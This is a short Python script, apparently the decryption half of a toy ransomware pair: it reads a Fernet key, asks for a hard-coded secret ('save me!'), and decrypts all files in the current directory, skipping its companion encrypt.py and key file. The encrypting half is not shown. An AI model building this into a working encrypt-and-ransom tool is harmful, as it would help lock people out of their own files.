import os
from cryptography.fernet import Fernet
files= []
for file in os.listdir():
	if file == "encrypt.py" or file == "actual_key.key" or file == "decrypt.py":
		continue
	files.append(file)
print (files)
with open("actual_key.key","rb") as actual_key:
	a = actual_key.read()
secret= "save me!"
user_input= input("Enter the secret: ")
if user_input == secret:
	for file in files:
		with open(file,"rb") as file1:
			content= file1.read()
		decrypt_content= Fernet(a).decrypt(content)
		with open(file,"wb") as file1:
			file1.write(decrypt_content)
	print("Enjoy your access again!")
else:
	print("Sorry, Wrong credentials!")
